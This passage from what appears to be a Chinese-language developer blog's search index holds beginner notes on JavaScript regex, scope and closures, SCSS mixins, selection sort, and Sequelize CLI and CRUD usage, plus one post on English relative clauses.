/\\*.{0,100}\\*/gtext.match(regExp) // ? 如果你這樣寫的話，意思是「* 之間可以夾 0 ~ 100 個連續的任意字元」，不過這樣子其實有一個以上的符合結果： *star is simply dummy text of the burst and stream* *star is simply dummy text of the burst and * *star is simply dummy text of the burst* *star* 在量詞沒有搭配 ? 來使用的時後，text.match(regExp) 的結果會是 ['*star* is simply dummy text of the *burst* and *stream*']，這是因為量詞預設會先從匹配數量「最多」的那個開始抓。所以 match 會先拿到第一個結果，並回傳對應的陣列。 如果現在加上 ? (/\\*.{0,100}?\\*/g)，結果就會從匹配數量「最少」的那個開始抓： *star* *burst* *stream* *star* 中不會再有其他能夠匹配的可能，所以才說是匹配數量少，而 *star* is simply dummy text of the *burst* and *stream* 中包含了所有能夠匹配的可能，所以才說是匹配數量最多。 （因為這邊有用 g，這個修飾子，所以找到第一個後還會在往後找） 因為大部分的情況下我們應該會比較想要把資料整理成這樣，所以這個搭配 ? 的用法要學會怎麼用。 搭配 String 方法使用match() 回傳符合條件的結果陣列，沒有找到符合對象回傳 null。 設定「包含 1 個數字」，「包含英文數字底線」的規則： 12345const str = 'hello'const regExpA = /\\d{1}/const regExpB = /\\w/gstr.match(regExpA) // nullstr.match(regExpB) // ['h', 'e', 'l', 'l', 'o'] search() 回傳第一個符合條件對象的索引值，沒有找到符合對象回傳 -1。 設定「包含 1 個數字」，「包含 h」的規則： 12345const str = 'hello'const regExpA = /\\d{1}/const regExpB = /\\h/str.search(regExpA) // -1str.search(regExpB) // 0 replace() 把符合條件的對象的值做替換，沒有符合的對象就回傳原字串。接收兩個參數，第一個是正規表達式，第二個是要替換的值。 設定「包含任意數字」，「包含任意英文數字底線」的規則： 12345const str = 'hello'const regExpA = /\\d/const regExpB = /\\w/str.replace(regExpA, 1) // 'hello'str.replace(regExpB, 1) // '1ello' 一些基礎範例設定「起始字串為 ab」的規則： 123const regExp = /^ab/regExp.test('abcdefg') // trueregExp.test('cccabc') // false 設定「結尾字串為 ab」的規則： 123const regExp = /ab$/regExp.test('abcdefg') // falseregExp.test('cccab') // true 設定「包含 ab 裡夾一個任意字元」的規則： 123const regExp = /a.b/regExp.test('a1234b') // falseregExp.test('aMb') // true 注意一個 . 代表的是一個字元。 設定「包含 任何數字」的規則： 1234const regExp = /\\d/regExp.test('123456') // trueregExp.test('abc') // falseregExp.test('abc123') // true 設定「包含 任何英文數字底線」的規則： 12345const regExp = /\\w/regExp.test('123456') // trueregExp.test('abc') // trueregExp.test('abc123') // trueregExp.test('?') // false 設定「包含 任何空白字元」的規則： 1234const regExp = /\\s/regExp.test('1 2 3') // trueregExp.test('a b c') // trueregExp.test('?') // false 設定「包含 a 或 b 」的規則： 1234const regExp = /a|b/regExp.test('123') // falseregExp.test('ac') // trueregExp.test('bc') // true 設定「包含 1 到 5」的規則： 123const regExp = /[1-5]/regExp.test('1239') // trueregExp.test('6') // false 想學更多可以參考的文章 Day 24: 正規表達式 參考資料Day30 什麼是 RegExp 正則表達式 ？十五分鐘認識正規表達式，解決所有文字難題不可見字元的坑","link":"/2021/12/15/regular-expression/"},{"title":"which？that？關係子句？","text":"由於關係子句在應該是一個很常見到的句型，就是會冒出一堆 which / that / who 等等的那種句子。 雖然它的基本概念不算太複雜，但有礙於篇幅比較長，所以我覺得還是把它獨立出來當成一篇文章來說明會比較清楚。 先認識關係子句明確的定義大概是這樣子： 關係子句是由關係代名詞(who, whom, whose, which, that)或關係副詞(when, where, why)所引導的形容詞子句。 先別吐槽，我知道大部分的人都不會從某個東西的官方定義去理解它的意思，不然我們就不需要上學，也不需要老師了。 不過你可以抓重點出來看，根據定義，我們至少能知道，關係子句就是由關係代名詞、關係副詞這兩個東西來組成的一個 「句子」 ，而這個句子的作用就是 「拿來形容某個你要講的東西」。 來看一些例子： I found a bug which is a SyntaxError.我找到了一個語法錯誤的 bug 你可以把這個句子看成是這樣子： I found a bug which is a SyntaxError. 要形容的東西 關係代名詞 “which is a SyntaxError” 這整句話就是「關係子句」，用來形容你前面說的那個 bug 。 “which” 是「關係代名詞」，在此處它有兩個作用： 當作 bug 這個詞的代名詞 連結前面的句子 所以一個完整的關係子句就大概是長這個樣子，而它又包含了關係代名詞與關係副詞這兩個東西，主要用途是來幫助你連接前面的句子。 所以最基本的，你要能分辨什麼時候用哪個詞，可以參考以下表格： 關係代名詞 關係副詞 用詞 who / whom / whose / which / that when / where / why 時機 指某個人、事、物 指某個時間、地點、原因 用途 當作代名詞、連接句子 連接句子 如果你不清楚 who / whom / whose / which / that 的差別，請參考這裡。 簡單來說。如果要形容的東西是指某個人、事、物，那就用關係代名詞。反之，如果要形容的東西是指時間、地點、原因，那就改用關係副詞。以剛剛的例子來說，因為要形容的東西是 “bug” ，所以就用關係代名詞。 如果是關係副詞的話，會像這樣： I remember the day when I first read JavaScript.我記得我第一次讀 JavaScript 的那一天。 This is the company where I met him yesterday.這是我昨天遇到他的那家公司。 That is the reason why I recommand arrow function instead of normal function.這就是我為什麼推薦箭頭函式而不是一般函示的原因。 I remember the day when I first read JavaScript 要形容的東西 關係副詞 This is the company where I met him yesterday 要形容的東西 關係副詞 That is the reason why I recommand arrow function instead of normal function 要形容的東西 關係副詞 試著去理解這個概念，會比刻意去死記來得容易，也不需要特別去記憶。就好比我們講中文的時候也會拿適當的詞語來形容某個東西，英文也一樣，不用想的太複雜。 為什麼需要關係子句？當你想不通一些東西時，我很推薦大家去這樣思考。 為什麼要有這個東西的存在？如果這個東西不存在的話會有什麼問題？ 當你能回答出這兩件事的時候，通常就能想通，不會在感到困惑了。所以讓我們來討論看看，為什麼要有關係子句，以及沒有關係子句的話會有什麼問題？ 既然我們已經知道，關係子句的作用只是拿來形容一個東西的句子而已。不知道你會不會疑惑，為什麼不直接拿一般的形容詞來形容就好了？其實你仔細想想，會發現並不是每個情境下，我們都有適合的形容詞來修飾我們想表達的東西。 例如： 有適合的形容詞時I love the newly-opened restaurant. 我超愛那家新開的餐廳 沒有適合的形容詞時I love the restarant that Tom recommand. 我超愛那家 Tom 推薦的餐廳 你可以看到第二個句子很明顯地，他只能那樣子去形容。 所以為什麼需要關係子句？，理由很簡單， 因為你找不到可以用的形容詞。 補充：有些時候可以省略關係代名詞當關係代名詞在關係子句中當作受詞的時候，可以省略，反之，如果在關係子句中當作主詞的時候，不能被省略。 例如： I love the restaurant (that) Tom recommended. 這裡的 that 作為（Tom recommended）的受詞 I love the restaurant that has a big signboard. 這裡的 that 作為（has a big signboard）的主詞 補充：以 what 來連結的句子是關係子句嗎？不是，what 所引導的是名詞子句，不像關係子句是形容詞子句。所以換句話說，這整句話只是一個用來接受某個動作的 「受詞」。既然是個受詞，就說明他並不是關係子句。 例如： I don’t know what are you talking about.我不知道你在說什麼。 “what are you talking about” 這一整句話會看做是 know 這個動作的「受詞」。 限定關係子句 vs 非限定關係子句這邊就只是在做個延伸，你可以大致了解一下，但真的弄不懂的話也沒關係。 當關係子句是使用關係代名詞時，可以在區分成 「限定關係子句」 與 「非限定關係子句」 非限定關係子句（東西可能是單個或是多個，但不限定範圍） 我不限定是哪些東西，因為東西只有一個，或我指的是所有的。 不用特別指出，大家都很清楚那是什麼東西。 對東西提供額外的資訊來補充說明。 拿掉的話，對方還是知道你是指什麼東西。 需要以 “逗號” 來分隔句子。 例如： I have a brother, who work at Japan.我有一個在日本工作的哥哥 代表你只有一個哥哥。 work at Japan 只是補充額外的資訊，說明哥哥在日本工作。 即便少了補充說明，別人也知道你在指哪位（因為你只有一個哥哥）。 Gorillas, which are large and originate in Africa, can sometimes be found in zoos.大猩猩很龐大且起源於非洲，有時候在動物園可以看到。 代表你指的是所有大猩猩（注意字尾有 s）這個群體， which are large and originate in Africa，只是補充額外的資訊，說明大猩猩的體型與起源。 如果省略掉，也不影響整個句子及語意。 限定關係子句（東西在一個範圍中，但限定指定的範圍） 我指的東西一定有一個以上，所以我必須指出是哪一個，或哪個範圍。 在一個某個範圍指一些特定的東西（代表有很多個） 拿掉的話，對方會不知道是指什麼東西 有這些資訊才能讓句子完整 例如： I have a brother who work at Japan.我有一個在日本工作的哥哥 代表你有一個以上的哥哥，而你說的是在日本工作那位。 你有很多個哥哥，所以 work at Japan 是一個必要的資訊，如果拿掉別人會不知道你在說誰。 Gorillas which name are Orangutan can sometimes be found in zoos.名字叫 Orangutan 的猩猩，有時候可以在動物園看到。 你指的是名子叫做 Orangutan 的大猩猩。 拿掉的話，雖然不影響句子，但會影響語意，因為別人只知道你是說所有的大猩猩，而不是名字為 “Orangutan” 的大猩猩。 做個彙整 限定關係子句 非限定關係子句 用途 提供完整的資訊 補充額外的資訊 若省略是否會影響句子 是 否 是否需要逗號 否 是 是否能省略關係代名詞 是 否 是否可以用 that 是 否 參考資料實用基礎文法（關係子句）實用基礎文法（關係代名詞）非限定關係子句 | 英語文法 | EF限定關係子句 | 英語文法 | EF文法教室】限定與非限定關係代名詞【英文文法】限定和非限定用法 這一篇教你如何清楚分辦！ - Engoo 線上英文家教-部落格風傳媒－what 是關係代名詞嗎？","link":"/2021/07/11/relative-clauses/"},{"title":"JavaScript 整理資料的範例","text":"得多加強這部分的能力。 簡述這是來自 Lidemy 第五期期中測驗 的題目。做完後發現我對「資料整理」的部分不夠熟，所以想記錄下來。 題目：給你一筆資料： 1234567891011[ {id: 1, value: 43}, {id: 1, value: 213}, {id: 2, value: 321}, {id: 3, value: 2}, {id: 3, value: 345}, {id: 4, value: 555}, {id: 4, value: 44}, {id: 3, value: 33}, {id: 3, value: 199},] 請整理成這樣： 123456[ {id: 1, value: [43, 213]}, {id: 2, value: 321}, {id: 3, value: [2, 345, 33, 199]}, {id: 4, value: [555, 44]}] 簡單來說就是「把重複出現 id 的變成一個，而值要是 value 湊成的陣列（或單一值）」 附註：順序不可以改變，例如原本是 2 =&gt; 1 =&gt; 3 的話結果也要是先 2 =&gt; 1 =&gt; 3 這樣排。 思路這題可以這樣子想： 先建立一個物件，把每個 id 出現的 value 給存起來 遍歷剛剛建好的物件，再整理成最後的格式 1234567891011121314151617181920212223242526272829303132333435363738394041424344function solve(arr) { const result = []; // 第一步：把每個 id 對應的 value 存起來 const valuesObject = retrieveValues(arr); // 第二步：遍歷物件，重新整理 for (let key in valuesObject) { if (valuesObject[key].length === 1) { // 只有一個 value 就把陣列拿掉 result.push({ id: Number(key), value: valuesObject[key][0] }) } else { result.push({ id: Number(key), value: valuesObject[key] }) } } return result;}function retrieveValues(arr) { /* 預期產出：{ ' 1': [30, 22], ' 2': [100], ' 3': [33, 55] } */ const collection = {}; // 附註：這邊存 ' 1' 是因為用 '1' 會被轉成「數字」重新排序， // 例如原本 {'5' : 1, '1': 2} 變成 {'1': 2, '5': 1}， // 所以一定要加上空格，才不會被轉成數字 for (const item of arr) { // 已存在的 id 就直接 push if (' ' + item.id in collection) { collection[' ' + item.id].push(item.value) } else { // 不存在就建一個新的 collection[' ' + item.id] = [item.value] } } return collection} 我也不知道為什麼一開始沒有想到這種解法，可能我真的太久沒做題目了吧 QQ","link":"/2022/03/17/reorganize-data/"},{"title":"引用模組的注意事項","text":"怕未來的某一天自己會踩到這個雷。 ./ 很重要如果你要引入的是「自己寫好的模組」，請務必加上 ./（根目錄資料夾）的相對路徑： 123// .js 可加可不加，但大部分情況不會加var myModule = require('./myModule') var myModule = require('./myModule.js') 反之，如果你引入的是從 npm 上下載的模組，或是系統內建的模組，就別加 ./： 12var leftPad = require('left-pad') // 從 npm 上下載的var OS = require('os') // 內建模組","link":"/2021/12/23/require-module-problem/"},{"title":"JavaScript 中的科學記號表示法","text":"冷知識～ 可以這樣來表示e 後面的數字代表幾個 0 10 = 1e1 100 = 1e2 1000 = 1e3 …","link":"/2021/12/26/scientific-notation/"},{"title":"再次理解什麼是作用域？","text":"一定要把它弄懂。 範例一12345678910function test () { // 假設 buttons.length = 5 const buttons = document.querySelectorAll('.btn') for (var i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log(i) }) }}test() 在這個例子中，按下按鈕時都會印出 5。 因為這邊只有一個作用域：test，每一個 callback 執行的時候都會到 test 裡面找 i，而這個時候的 i 已經是迴圈跑完的值，也就是 5。 範例二12345678910// 假設 buttons.length = 5const buttons = document.querySelectorAll('.btn')for (var i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', scope(i))}function scope(num) { return function () { console.log(num) }} 為什麼這樣就可以記住 i 的值？可以想成是這樣子： 12345678910111213141516171819202122232425262728293031323334/* 第一圈 num = 0 等 callback 被執行的時候， 回來這個 scope 裡面找 num num 的值就是 0 */function scope(num) { return function () { console.log(num) }}/* 第二圈 num = 1 等 callback 被執行的時候， 回來這個 scope 裡面找 num num 的值就是 1*/function scope(num) { return function () { console.log(num) }}/* 第三圈 num = 2 等 callback 被執行的時候， 回來這個 scope 裡面找 num num 的值就是 2*/function scope(num) { return function () { console.log(num) }}... 也就是說你每一圈執行 scope 的時候都產生了一個新的作用域，在這個作用域裡面 num 的值就是迴圈 i 的值，所以 callback 回到 scope 作用域裡面找變數的時候，就會是一開始傳進去的那個值。 範例三1234567// 假設 buttons.length = 5const buttons = document.querySelectorAll('.btn')for (let i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log(i) })} let 的作用域是以 {} 來當作單位，每圈都會產生一個 {}，像這樣： 12345678910111213141516171819202122232425262728293031323334353637/* 第一圈 i = 1 等 callback 被執行的時候， 回來這個 scope 裡面找 i i 的值就是 1*/{ let i=0 function () { console.log(i) }}/* 第二圈 i = 1 等 callback 被執行的時候， 回來這個 scope 裡面找 i i 的值就是 1*/{ let i=1 function () { console.log(i) }}/* 第三圈 i = 2 等 callback 被執行的時候， 回來這個 scope 裡面找 i i 的值就是 2*/{ let i=2 function () { console.log(i) }}...","link":"/2022/01/19/scope-difference/"},{"title":"最容易搞錯的 Scope","text":"懶人包。 簡述1234567891011121314var a = 'global scope';function yoyo () { var a = 'yoyo scope' function haha () { var a = 'haha scope'; mistake() } haha()}yoyo()function mistake () { console.log(a) // global, yoyo, haha ?} 答案是 global。 你很容易會以為是這樣： 1234567891011121314var a = 'global scope';function yoyo () { var a = 'yoyo scope' function haha () { var a = 'haha scope'; // 在這邊呼叫的感覺會讓人以為是這樣 mistake() function mistake () { console.log(a) // haha？ } } haha()}yoyo() 可是不是，我們會說 JS 的作用域是「靜態作用域」，是因為作用域在宣告的時候就已經決定了，所以才說是「靜態的」。 至於上面那個錯誤的示範是「動態作用域」，代表作用域會根據「呼叫」的地方變來變去。","link":"/2022/03/06/scope-mistake/"},{"title":"螢幕閱讀者友善的 a 標籤","text":"無障礙一下。 我來當你的導盲犬很多時候我們會使用icon-font來當作社群媒體的連結圖案，所以可能很常見到以下這段原始碼： 123&lt;a href=\"#\"&gt; &lt;i class=\"fab fa-facebook-square\"&gt;&lt;/i&gt;&lt;/a&gt; 單從視覺上來看沒什麼問題，但使用螢幕閱讀器的使用者會不知道這個連結的作用， 所以建議可以加上 aria-label 屬性，來幫這個連結加上一個內容，像這個樣子： 123&lt;a href=\"#\" aria-label=\"this is our link of facebook\"&gt; &lt;i class=\"fab fa-facebook-square\"&gt;&lt;/i&gt;&lt;/a&gt; 這樣當螢幕閱讀器執行到這邊時，就會唸出「this is our link of facebook」。","link":"/2022/01/16/screen-reader-friendly-a/"},{"title":"SCSS隨筆記","text":"紀錄一些 SCSS 的相關語法 語法導覽 Variable 變數 Nesting 巢狀結構 &amp; 無縫選取器 @Import 匯入 @mixin 混合 Variable 變數建立變數的方式： 123456789// colors$primary-white: #fff;$primary-orange: hsl(31, 77%, 52%);$normal-cyan: hsl(184, 100%, 22%);// fonts$primary-font-size: 15px;$primary-font-family: 'Lexend Deca', sans-serif;$primary-font-line-height: 1.5; 網頁中很常用到的色彩、文字設定等，都很適合拿來存在變數中。 可以設定的值： 數值：（0) 字串：（'Jim', \"Jim\", Jim） 顏色：（#000） 布林值：（true, false） 空值：（null） 陣列：（10px 20px 30px, Arail, sans-serif）（以空格或逗號隔開） maps：（(key1 : value1, key2: value2)）類似物件 Nesting 巢狀結構假設我們有一段 HTML 的結構如下： 1234567&lt;div class=\"wrap\"&gt; &lt;div class=\"container\"&gt; &lt;h2 class=\"heading\"&gt;&lt;/div&gt; &lt;img class =\"pic\" src=\"/path\"&gt; &lt;p class=\"txt\"&gt;&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 以往在 CSS 中可能得這樣子寫： 12345678910111213.wrap { /* ... */}.wrap .container { /* ... */}.wrap .container .heading { /* ... */}/* 以此類推 */ 但如果是 SCSS： 123456789101112131415.wrap { // ... .container { // ... .heading { // ... } .pic { // ... } .txt { // ... } }} 顯然 SCSS 不管在簡潔還是結構上看起來都大勝 CSS 吧！不過別忘了，當 SCSS 被編譯成 CSS 後，其實就和第一個長的一模一樣哦。 &amp; 無縫選取器注意：這個名稱是我自己發明的，純粹是覺得「連結選取器」這個名字太饒口。 它真正的意思是： The ampersand (&amp;) is a wonderful little character. It’s an ancient symbol, a ligature of the Latin “Et,” that connects words, phrases, and thoughts. 意思是說，&amp;是一個來自拉丁文中的 連字符號 (Et)” ，用來把文字、片段、思想給連接起來。 現今我們會用 &amp; 來表示英文的「and 或 as well as」，或是中文的「且」，但都跟他最原始的意思差不多，總而言之，都是用來把 A 跟 B 給連在一起的意思 在 SCSS 中也是一樣，讓我們看個示範： 123456.btn { color: black; &amp;:hover { color: white; }} 等於： 123456.btn { color: black;}.btn:hover { color: white;} 你應該有看出來，正常情況下.btn跟:hover之間應該要有一個「空格（空白字元）」，但現在用了 &amp; 這個符號後，這個空格就會消失了，這也就是為什麼我會叫他無縫的原因。 當然，你也可以用正規的解釋，意思是把.btn跟:hover給連結起來，這樣也行，看你喜歡哪個就好了。 @Import 匯入你可以使用@import來匯入一個外部連結： 12// google font@import url('https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700&amp;display=swap'); 除此之外，你也可以利用@import來做一件很方便的事情。 首先聰明的你知道，把檔案分開來比較好做管理，所以你有 3 個檔案，分別為： reset.scss layout.scss page.scss 但是你也知道， SCSS 寫完後還得做編譯這件事，所以我們得編譯 3 次， 所以當檔案越來越多的時候，絕對會變得很麻煩，有沒有更好的做法？ 有，就是用@import的方式來操作。 我們只需要在建立一個all.scss檔案，並且把其他檔案都加上下底線_，像這樣： 加下底線是用來代表，這是一個被拿來合併的檔案。 all.scss _reset.scss _layout.scss _page.scss 接著在 all.scss 中去引入另外 3 個檔案，像這樣： 12345// 在 all.scss 引入另外 3 個檔案// 此處要引入的檔案不需要加上下底線@import 'reset';@import 'layout';@import 'page'; 這樣子 all.scss 就會按照順序去引入這些檔案，而之後你也只需要去編譯 all.scss 這個檔案即可。 @mixin 混合💡 註：你也可以把它想成是山寨版的function，他可以設定參數及帶入變數，但沒有if / for的功能。 簡單來說就是把一群值給集合起來，所以才叫mixin。 舉個最簡單的例子： 12345678910@mixin border-radius { -webkit-border-radius: 10px; -moz-border-radius: 10px; -ms-border-radius: 10px; -o-border-radius: 10px; border-radius: 10px;}.box { @include border-radius;} 如果現在你有 10 個區塊都要用到border-radius，你會想寫 50 行還是 5 行呢？ 設定參數 不同區塊的border-radius值可能不一樣，所以這時候改成用參數來設定，就可以帶來更大的彈性： 1234567891011@mixin border-radius($radius) { -webkit-border-radius: $radius; -moz-border-radius: $radius; -ms-border-radius: $radius; -o-border-radius: $radius; border-radius: $radius;}.box { // 現在可以自訂radius的值囉！ @include border-radius(10px);} 預設參數值 有沒有聞到 ES6 的味道？ 如果你希望參數能有個預設的初始值，那你可以這樣子寫： 1234567891011121314@mixin border-radius($radius: 10px) { -webkit-border-radius: $radius; -moz-border-radius: $radius; -ms-border-radius: $radius; -o-border-radius: $radius; border-radius: $radius;}.box { // 如果不指定值，就採用預設值 (10px) @include border-radius(10px); // 如果指定值，就套用設定的值 (20px) @include border-radius(20px);} 省略部分參數值 舉個例子： 1234567891011121314@mixin background( $size: cover, $position-x: center, $position-y: center, $repeat: no-repeat) { background-size: $size; background-position: $position-x $position-y; background-repeat: $repeat;}.box { @include background;} 如果現在我只想修改$repeat的值，那在@include的時候該怎麼寫呢？ 123.box { @include background($repeat: repeat);} 很簡單，只要把想要修改的那個參數叫出來設定即可，而其他的沒動到的部分就會自動套用預設值。 帶入變數 如果你要在@mixin裡面引用某個變數也是 OK 的。 1234567891011$value: 10px;@mixin border-radius { -webkit-border-radius: $value; -moz-border-radius: $value; -ms-border-radius: $value; -o-border-radius: $value; border-radius: $value;}.box { @include border-radius;} 利用 @content 加入額外的內容 如果有些東西是額外添加的，不想寫死在@mixin中，你可以使用@content，就可以讓你在使用@mixin的時候能夠額外寫入一些自己想寫的東西。 這裡拿media query來做一個示範： 123456789101112131415@mixin mediaQuery-pc { // 桌機板的 media @meida screen and (min-width: 760px) { // 內容自己填 @content; }}.box { padding: 10px; @include mediaQuery-pc { padding: 20px; }} 這樣子寫的話你的media query就會乾淨很多。 這裡提供一個簡單的 RWD 示範： See the Pen by jim (@jubeatt) on CodePen. 💡 註：方塊的顏色會隨著寬度做改變。 參考資料sparkbox30 天掌握 Sass 語法 - (5)利用 Sass「@import」進行 CSS 檔案模組切割30 天掌握 Sass 語法 - (18)規劃你的 Sass 結構SASS 教學 ＋ SCSS：CSS 再進化，掌握語法攻略！SCSS 15 分鐘入門","link":"/2021/07/28/scss-note/"},{"title":"選擇排序法（Selection sort）","text":"最直覺的排序法。 概念每次都從數列中找出最小的，然後移到最左邊。 流程圖： 步驟123456repeeat (numOfElement - 1) time set the first unsorted element as the minimum for each of the unsorted elements if element &lt; currentMinimum set element as new minumum swap minimum with first unsorted position 12345678遍歷所有數字（迴圈） 把第一個數字當作最小值 遍歷後面的未排序數字（迴圈） 如果數字 &lt; 目前的最小值 更新最小值成這個數字 迴圈結束 把第一個數字跟最小值交換位置迴圈結束 實作123456789101112131415161718192021222324252627282930313233343536373839404142function selectionSort(arr) { // 遍歷所有數字 for(let i=0; i&lt;arr.length; i++) { // 把第一個數字當作最小值 let minumum = arr[i] /* 儲存最小值的位置： 注意如果寫成 null 會有問題， 因為有可能第一個數字就是最小值， indexOfMinumum 就會不會被更新，保留 null 值 這樣會導致最後交換時出錯（unSotredNumbers[null]） 所以正確的作法是把最小值設為第一個數的位置， 當第一個數就是最小值時，也只是把自己跟自己交換位置而已 */ let indexOfMinumum = i // 遍歷後面未排序的數字 for (let j=i+1; j&lt;arr.length; j++) { // 如果數字 &lt; 目前最小值 if (arr[j] &lt; minumum) { // 更新最小值 minumum = arr[j] // 更新最小值位置 indexOfMinumum = j } } /* 交換位置： 1. 儲存第一個數字 2. 把第一個數設成最小值 3. 把最小值設成第一個數字 */ let temp = arr[i] arr[i] = minumum arr[indexOfMinumum] = temp } // 排序好的數字 return arr}const unSotredNumbers = [3, 4, 28, 47, 16, 15, 40 ,5, 7, 12, 40, 8, 39, 50, 32, 87]console.log(selectionSort(unSotredNumbers))// [3, 4, 5, 7, 8, 12, 15, 16, 28, 32, 39, 40, 40, 47, 50, 87] 關於 null 的 bug 可以參考這裡： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[1 ,2 ,3] length:3初始化設定i=0minumum: 1indexOfMinumum: null找出最小值j=1Not found 交換數字let temp = unSotredNumbers[i] =&gt; 1unSotredNumbers[i] = minumum =&gt; 1 = 1unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 1初始化設定i=1minumum: 2indexOfMinumum: null找出最小值j=2Not found 交換數字let temp = unSotredNumbers[i] =&gt; 2unSotredNumbers[i] = minumum =&gt; 2 = 2unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 2初始化設定i=2minumum: 3indexOfMinumum: null找出最小值j=3Not found 交換數字let temp = unSotredNumbers[i] =&gt; 3unSotredNumbers[i] = minumum =&gt; 3 = 3unSotredNumbers[null] = temp =&gt; unSotredNumbers.null = 3最後結果[1, 2 ,3, null: 3]","link":"/2022/01/17/selection-sort/"},{"title":"Sequelize-CLI 基本使用","text":"寫起來才不會忘。 懶人包第一步當然是先安裝起來： 1npm install --save-dev sequelize-cli 接下來的步驟： 初始化 npx sequelize-cli init 產生 model model:generate 執行 migration db:migate 初始化使用 npx sequelize-cli init 來初始化 ORM，不過其實也能 node_modules/.bin/sequelize init，速度上可能會快一點。 總之這一步會產生幾個資料夾： 12345678├───config│ config.json 連到資料庫的設定檔│├───migrations 管理資料庫的狀態（新建 or 刪除） ├───models│ index.js 用來自動產生 model│└───seeders 用來放種子檔案 這邊最重要的是先去 config.json 把資料庫連線給設定好，接著就能進到下一步了。 至於 migrations 的部分做個解釋，可以把它想成是「用來改變資料庫狀態」的東西，裡面會有兩個 function：up 和 down。 up 的作用就是「當要進入下一個狀態時，create 一個新的 table」，而 down 則是「當要返回到前一個狀態時，drop 掉原本的 table。 所以： 進入下個狀態：db:migrate 返回上個狀態：db:migrate:undo 建立 Model建立 Model 的指令：model:generate name 代表 Model 名稱 attribute 代表結構的設定 1npx sequelize-cli model:generate --name User --attributes firstName:string,lastName:string,email:string 其實就跟這個一樣，只是改成用 CLI 來處理而已： 1234567891011// 定義一個 User 的 tableconst User = sequelize.define('User', { // 設定欄位資訊 firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING }}) 執行完後就會產生一個新的 Model 和 Migration： 12345├───migrations│ 20220325094327-create-user.js // 新增的檔案├───models│ index.js │ user.js 新產生的 model 接著可以注意一下 Model 的部分： 123456789101112131415161718192021'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class User extends Model { static associate(models) { // 要關聯的 table 寫在這裡 } } User.init({ // 根據剛剛下的指令產生的 Schema firstName: DataTypes.STRING, lastName: DataTypes.STRING, email: DataTypes.STRING }, { sequelize, modelName: 'User', }); return User;}; 如果你對產出來的結果不滿意，都可以在這裡做修改。 執行 Migration1npx sequelize-cli db:migrate 簡單來說，這一步就跟 sync 在做的事情一樣，到這裡才是真正到資料庫建立 table 最後上面都做好以後，就可以直接在你的 JS 裡面使用 ORM 了： 12345678910// 所有 model 都會被綁在 db 上const { User, Comment } = require('./models');// 建立新的資料User.create({ firstName: 'PeaNu', lastName: 'yoyo'}).then(() =&gt; { console.log('done');}) 就這麼簡單囉。 附註：想要改 Schema 的話要怎麼改補更：改了 Migration 後一樣要改 Model，不然後來的操作會有 Bug（找不到對應欄位，變成空值） 如果是透過 db:migrate 的方式來同步資料庫，那就要去改 migration 裡面的資料，強調一下： 不是改 Model 不是改 Model 不是改 Model 改 Model 只適用在 sync 的情況，這點要特別注意。 接著流程是這樣： 先去改 migration 中的內容 db:migate:undo 先回到上一層狀態 db:migate 建立新的 migration 就這麼簡單囉！","link":"/2022/03/25/sequelize-cli-basic/"},{"title":"Sequelize 的 CRUD","text":"凡事從 CRUD 開始。 新增資料Model.create() 123const jane = await User.create({ firstName: \"Jane\", lastName: \"Doe\" });// 建立時的 idconsole.log(\"Jane's auto-generated ID:\", jane.id); 撈出資料Model.findAll() 123// Find all usersconst users = await User.findAll();console.log(\"All users:\", JSON.stringify(users, null, 2)); 也可以指定要哪些欄位： 1234Model.findAll({ attributes: ['foo', 'bar']});// SELECT foo, bar FROM ... 或加上 WHERE： 1234567Post.findAll({ where: { authorId: 2 authorId: [2, 3] }});// SELECT * FROM post WHERE authorId = 2; 如果要使用「運算子」的話： 12345678910// 預設就有引入，只是寫出來給你看const { Op } = require(\"sequelize\");const users = await User.findAll({ where: { id: { [Op.gt]: 2 } }});// SELECT * FROM post WHERE authorId &gt; 2; 其他的運算子（只列我應該會用到的）： 1234567891011121314151617181920212223const { Op } = require(\"sequelize\");Post.findAll({ where: { [Op.and]: [{ a: 5 }, { b: 6 }], // (a = 5) AND (b = 6) [Op.or]: [{ a: 5 }, { b: 6 }], // (a = 5) OR (b = 6) someAttribute: { // Basics [Op.eq]: 3, // = 3 [Op.ne]: 20, // != 20 [Op.is]: null, // IS NULL [Op.not]: true, // IS NOT TRUE [Op.or]: [5, 6], // (someAttribute = 5) OR (someAttribute = 6) // Number comparisons [Op.gt]: 6, // &gt; 6 [Op.gte]: 6, // &gt;= 6 [Op.lt]: 10, // &lt; 10 [Op.lte]: 10, // &lt;= 10 [Op.between]: [6, 10], // BETWEEN 6 AND 10 [Op.notBetween]: [11, 15], // NOT BETWEEN 11 AND 15 } }}); 更新資料Model.update() 123456789101112// 把 id &gt;= 2 的都改名~async function () { const result = await User.update({ firstName: 'peanu'} ,{ where: { id: { [Op.gte]: 2 } } }); // 影響了幾欄 console.log(\"affected row:\", result);}() 刪除資料Model.destroy() 12345678910// 把 id &gt;= 2 的都刪掉~async function () { const result = await User.destroy({ where: { id: 5 } }) // 影響了幾欄 console.log(\"result:\", result);}() 排序想要設定 ORDER BY 可以這樣設： 123456789~async function () { const result = await Comment.findAll({ // 根據 id 降冪排序 order: [ ['id', 'DESC'] ] }); console.log(JSON.stringify(result, null, 4));}() 其他比較方便的寫法直接根據 id 搜尋（準確來說是 Primary key）： Model.findByPk() 123456789~async function () { const user = await User.findByPk(1); // 接著就可以直接對 id=1 的 user 做事情了 const result = await user.update({ lastName: 'hahaha' }) // 跟 jQuery 很像，這邊還是會回傳 user，讓你可以一直鏈結下去 console.log('result', result);}() 只想要撈出一筆資料： Model.findOne() 12345678910111213~async function () { const user = await User.findOne({ where: { id: 1 } }); // 接著就可以直接對 id=1 的 user 做事情了 const result = await user.update({ lastName: 'hahaha' }) // 跟 jQuery 很像，這邊還是會回傳 user，讓你可以一直鏈結下去 console.log('result', result);}()","link":"/2022/03/25/sequelize-crud/"},{"title":"重新理解 Sequelize 中的 Migration 和 Model","text":"希望真的有搞清楚了。 sequelize 的 migration簡述之前常常搞不清楚 Model 和 Migration 之間 的差別在哪裡，所以這邊先做個解說。 Model 歸 Model，Migation 歸 